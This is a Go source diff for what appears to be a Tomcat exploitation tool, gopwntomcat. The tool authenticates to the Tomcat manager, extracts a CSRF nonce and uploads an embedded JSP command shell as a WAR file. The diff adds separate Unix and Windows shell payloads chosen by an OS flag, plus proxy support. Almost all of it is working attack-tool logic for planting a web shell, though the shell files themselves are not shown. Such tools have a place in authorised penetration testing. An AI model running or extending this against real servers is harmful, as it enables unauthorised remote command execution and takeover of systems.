@@ -14,6 +14,7 @@ import (
 	"log"
 	"net/http"
 	"net/http/cookiejar"
+	"net/url"
 	"os"
 	"regexp"
 	"strings"
@@ -21,8 +22,11 @@ import (
 	"github.com/patrickhener/gopwntomcat/utils"
 )
 
-//go:embed cmdshell.jsp
-var embeddedShell []byte
+//go:embed cmdshell_unix.jsp
+var embeddedShellUnix []byte
+
+//go:embed cmdshell_windows.jsp
+var embeddedShellWindows []byte
 
 type exploiter struct {
 	appBase   string
@@ -37,6 +41,7 @@ type exploiter struct {
 	pass      string
 	jsp       string
 	csrf      string
+	os        string
 }
 
 func (e *exploiter) constructURL() string {
@@ -61,11 +66,11 @@ func (e *exploiter) accessManager() error {
 	}
 
 	if resp.StatusCode == 401 {
-		return fmt.Errorf("Manager wants to have authentication. Did you remember to put '-user' and '-pass' and are they correct? HTTP Status %+v", resp.StatusCode)
+		return fmt.Errorf("manager wants to have authentication. Did you remember to put '-user' and '-pass' and are they correct? HTTP Status %+v", resp.StatusCode)
 	}
 
 	if resp.StatusCode != 200 {
-		return fmt.Errorf("No access to the manager app: HTTP Status %+v", resp.StatusCode)
+		return fmt.Errorf("no access to the manager app: HTTP Status %+v", resp.StatusCode)
 	}
 
 	// extract csrf (CSRF_NONCE=...) from body
@@ -110,7 +115,15 @@ func (e *exploiter) uploadPayload() error {
 			return err
 		}
 	} else {
-		shell = embeddedShell
+		if strings.ToLower(e.os) == "unix" || strings.ToLower(e.os) == "linux" {
+			log.Println("Choosing unix/linux payload")
+			shell = embeddedShellUnix
+		} else if strings.ToLower(e.os) == "win" || strings.ToLower(e.os) == "windows" {
+			log.Println("Choosing windows payload")
+			shell = embeddedShellWindows
+		} else {
+			log.Fatalf("OS %s not supported. Choose from 'unix', 'linux', 'windows'", e.os)
+		}
 	}
 
 	log.Printf("Uploading %d bytes as %s.war ...", len(shell), e.appBase)
@@ -211,7 +224,7 @@ func (e *exploiter) exploit() {
 }
 
 // Start will start the pwning
-func Start(rhostsFlag utils.Rhosts, port int, ssl bool, targeturi, user, pass, customJSP string) {
+func Start(rhostsFlag utils.Rhosts, port int, ssl bool, targeturi, user, pass, customJSP string, proxy string, oper string) {
 	var exploiter exploiter
 	if len(rhostsFlag) > 1 {
 		log.Println("Only choose one '-rhost' to pwn")
@@ -238,12 +251,26 @@ func Start(rhostsFlag utils.Rhosts, port int, ssl bool, targeturi, user, pass, c
 	exploiter.port = port
 	exploiter.ssl = ssl
 	exploiter.targeturi = targeturi
-	exploiter.client = &http.Client{
-		Jar: exploiter.cookieJar,
+	if proxy != "" {
+		prx, err := url.Parse(proxy)
+		if err != nil {
+			panic(err)
+		}
+		exploiter.client = &http.Client{
+			Jar: exploiter.cookieJar,
+			Transport: &http.Transport{
+				Proxy: http.ProxyURL(prx),
+			},
+		}
+	} else {
+		exploiter.client = &http.Client{
+			Jar: exploiter.cookieJar,
+		}
 	}
 	exploiter.user = user
 	exploiter.pass = pass
 	exploiter.jsp = customJSP
+	exploiter.os = oper
 
 	exploiter.exploit()
 }
